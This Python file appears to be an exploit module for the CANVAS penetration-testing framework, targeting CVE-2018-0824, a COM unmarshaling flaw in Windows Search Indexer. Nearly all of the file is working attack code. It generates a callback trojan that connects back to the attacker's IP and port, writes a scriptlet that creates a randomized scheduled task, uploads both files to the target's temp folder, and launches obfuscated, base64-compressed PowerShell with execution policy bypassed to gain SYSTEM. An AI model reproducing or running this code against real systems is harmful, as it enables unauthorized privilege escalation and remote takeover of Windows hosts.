#!/usr/bin/env python

import os
import sys
import random
import string
import zlib
import base64
import time

if '.' not in sys.path:
    sys.path.append('.')

from exploitutils import *
from ExploitTypes.windowsLocalExploit import WindowsLocalExploit
from shellcode.standalone.windows.payloads import payloads
from shellcode.standalone.windows.payloads64 import payloads as payloads64
import canvasengine
from MOSDEF import pelib

from WindowsConstants import KEY_QUERY_VALUE
from WindowsConstants import HKEY_LOCAL_MACHINE
from WindowsConstants import GENERIC_WRITE

from libs.canvasos import canvasos

import logging


NAME                           = 'CVE-2018-0824 QC Marshal Interceptor Insecure COM Unmarshal LPE'
DESCRIPTION                    = 'QC Marshal Interceptor insecure COM moniker unmarshaling in Search Indexer allows SYSTEM-privileged local code execution'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'Microsoft'
DOCUMENTATION['Repeatability'] = 'Infinite'
DOCUMENTATION['CVE Name']      = 'CVE-2018-0824'
DOCUMENTATION['CVE Url']       = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0824'
VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [ ['Windows', 'x86'],
                                   ['Windows', 'x64'],
]
PROPERTY['MS PATCHES']         = [""]

PROPERTY['VERSION']            = ['Windows 10',
                                  'Windows 8.1']
DOCUMENTATION["References"]    = ["https://codewhitesec.blogspot.com/2018/06/cve-2018-0624.html",
                                  "http://m.bianma.org/jishu/1473.html",
                                  "https://bbs.pediy.com/thread-228829.htm",
                                  "https://bbs.ichunqiu.com/thread-42157-1-1.html",
]
DOCUMENTATION['Notes']         = """
Tested against:
---------------
Windows 7 x86       - NOT VULNERABLE
Windows Server 2016 - NOT VULNERABLE

Windows 8.1      - SUCCESSFUL EOP
Windows 10 1607  - SUCCESSFUL EOP
Windows 10 10240 - SUCCESSFUL EOP

Credits
---------------
+ Mattias Kaiser for inspiring our exploit
+ James Foreshaw of Google Project Zero for exposing the method of
  forcing a COM service to demarshal an object written to an IStorage
  object

IMPORTANT CEU NOTE
---------------
As of 6/29/2018 you must set the target host to the IP address of the
node on which you wish to escalate.

"""

CHANGELOG = """
"""

targets = {
    0: ['Autodetect', [0, 0, 0, 0]]
}

random_name_chars = [chr(x) for x in range(ord('a'), ord('z')+1) + range(ord('A'), ord('Z')+1) + range(ord('0'), ord('9')+1)]

def random_string(length):
    global random_name_chars

    chars = []

    for i in range(0, length):
        chars.append(random_name_chars[random.randint(0, length)])

    return "".join(chars)


class theexploit(WindowsLocalExploit):
    def __init__(self):
        WindowsLocalExploit.__init__(self)
        self.name                   = NAME
        self.node                   = None
        self.local_res              = os.path.join(os.path.dirname(__file__), 'Resources')
        self.use_local_interface    = True

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def get_replacers(self, text):
        replacers = set([])
        state = 0
        replacer_allowed_chars = ["_"]
        replacer_allowed_chars.extend(string.ascii_letters)

        current = []

        for i in text:
            if state == 0:
                if i == "{":
                    current.append(i)
                    state = 1
            elif state == 1:
                if i.isspace() or i not in replacer_allowed_chars:
                    state = 0
                    if i == "}":
                        current.append(i)
                        if len(current) != 2:
                            replacers.add("".join(current))
                    current = []
                else:
                    current.append(i)

        return replacers


    def prepare_artifacts(self, tmp_directory):
        sct_name = "%s.sct" % str(random.randint(100001, 2000000))
        sct_local_path = os.path.join(self.local_res, "tmp_%s" % sct_name)
        sct_rem_path = tmp_directory + sct_name

        mosdef_name = random_string(len("mosdefcallback")) + ".exe"
        mosdef_local_path = os.path.join(self.local_res, "tmp_%s" % mosdef_name)
        mosdef_rem_path = tmp_directory + mosdef_name

        return_value = [(sct_local_path, sct_rem_path),
                        (mosdef_local_path, mosdef_rem_path)]

        # Generate the MOSDEF executable

        t_os = canvasos('WINDOWS')
        t_os.arch = 'X64' if self.is_64bit_node() or self.has_wow64() else 'X86'

        created_trojan = self.buildmosdeftrojan(self.callback.ip, self.callback.port, t_os, universal=True)

        if created_trojan != True:
            logging.error("Error in generating our MOSDEF executable")
            return None
        else:
            logging.info("Writing MOSDEF callback to %s" % mosdef_local_path)

            with open(mosdef_local_path, "wb") as handle:
                handle.write(self.mosdeftrojan)

        sct_data = None

        with open(os.path.join(self.local_res, "template.sct"), "rb") as handle:
            sct_data = handle.read()

        sct_replacers = self.get_replacers(sct_data)
        
        for replacer in sct_replacers:
            if replacer == "{mosdefpath}":
                sct_data = sct_data.replace(replacer, mosdef_rem_path.replace("\\", "\\\\"))
            else:
                replacer_string = random_string(random.randint(1, 8))
                
                sct_data = sct_data.replace(replacer, replacer_string)
                if replacer == "{randomtaskname}":
                    logging.info("Injected scheduled task name: %s" % replacer_string)

        logging.info("Writing SCT file to %s" % sct_local_path)
        logging.info("Writing callback file to %s" % mosdef_local_path)

        with open(sct_local_path, "wb") as handle:
            handle.write(sct_data)

        return return_value

    def make_encoded_command(self, node_ps):
        compressed_content = zlib.compress(node_ps)
        # remove header and footer of the compressed package
        rawchunk = compressed_content[2:-4]
        enc_chunk = base64.b64encode(rawchunk)
        command = "sal x New-Object;iex(x IO.StreamReader((x IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('%s'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" % enc_chunk

        return command


    def spawn_exploit(self, sct_path):
        exploit_cs = None
        with open(os.path.join(self.module_path, "Resources", "exploit.cs"), "rb") as handle:
            exploit_cs = handle.read()

        exploit_cs = exploit_cs.replace("SCT_PATH", sct_path.replace("\\", "\\\\"))

        exploit_ps = "$source = @\"\r\n%s\r\n\"@; add-type -ignorewarnings -typedefinition $source; [Program]::Main()" % exploit_cs

        encoded_ps = self.make_encoded_command(exploit_ps)


        # NOTE: this exploit does not support Windows XP or Windows 7
        # if self.is_win81_node():
        #     osVersion = 'win81'
        # elif self.is_win10_node():
        #     osVersion = "win10"
        # else:
        #     major, minor, sp = self.GetVersionEx()
        #     logging.warning("Unsupported OS (GetVersionEx %d.%d.%d), bailing" % (major, minor, sp))
        #     return 0

        # logging.info("Spawning exploit: %s (version: %s)" % (path, osVersion))
        logging.info("Spawning exploit")
        
        try:

            ret = self.node.shell.CreateProcessA("powershell -executionpolicy bypass \"%s\"" % encoded_ps,
                                                 #inherithandles = 1,
                                                 dwCreationFlags = 0x08000000)

        except Exception, ex:
            logging.error('%s' % ex)
            return False

        return ret

    def detect_releaseid(self):
        RELEASEID_KEY = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
        hKey = self.node.shell.get_reg_key_handle(HKEY_LOCAL_MACHINE, RELEASEID_KEY, KEY_QUERY_VALUE)

        releaseid = int(str(self.node.shell.RegQueryValueEx(hKey, "ReleaseID")[2]).strip('\0'))

        return releaseid


    def run(self):
        ret = 0
        self.module_path = os.path.dirname(__file__)
        for node in self.argsDict['passednodes']:
            self.summary[node] = 0
            self.node = node

            if not self.is_windows_node():
                continue

            if not any([self.is_win81_node(),
                        self.is_win10_node()]):
                logging.info("Not Windows 8.1 / 10 node! Aborting")
                continue

            if self.is_win10_node():
                releaseid = self.detect_releaseid()
                logging.info("Windows 10 %d" % releaseid)

                win10 = [1507, 1607]
                if not int(releaseid) in win10:
                    logging.warning("Windows 10 Release ID not supported")
                    continue

            # first, we check to make sure we are not
            # already local/SYSTEM
            if self.compromised():
                logging.warning("It appears you are already running as LOCAL/SYSTEM")
                continue

            tmp_path = self.node.shell.GetTempPathA()
            if not tmp_path:
                logging.error('Could not resolve full temp dir path')
                continue
            else:
                logging.info('Temp dir: %s' % tmp_path)

            if self.node.shell.chdir(tmp_path) < 0:
                logging.error('Could not chdir into %s' % tmp_path)
                continue

            pe_info = self.prepare_artifacts(tmp_path)

            logging.info("Callback IP: %s" % self.callback.ip)
            logging.info("Callback port: %s" % self.callback.port)

            if pe_info == None:
                logging.error("Failed to generate necessary executables")
                return 0

            remote_exploit_path = None

            for (local_path, remote_path) in pe_info:
                if not self.nodeUpload(local_path, remote_path):
                    logging.error('Error while uploading exploit binary')
                    return 0

                os.unlink(local_path)

            remote_sct_path = pe_info[0][1]

            problem_exploit = False

            if not self.spawn_exploit(remote_sct_path):
                logging.error('Could not spawn %s' % NAME)

            count = 0
            while not self.ISucceeded() and count < 5:
                count += 1
                time.sleep(2)

            if not self.ISucceeded():
                logging.warning("Failed to catch node")
                logging.warning("Aborting")
                ret = 0
            else:
                self.summary[node] = 1
                ret = 1

            self.add_file_for_cleanup(remote_sct_path)

        return ret


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
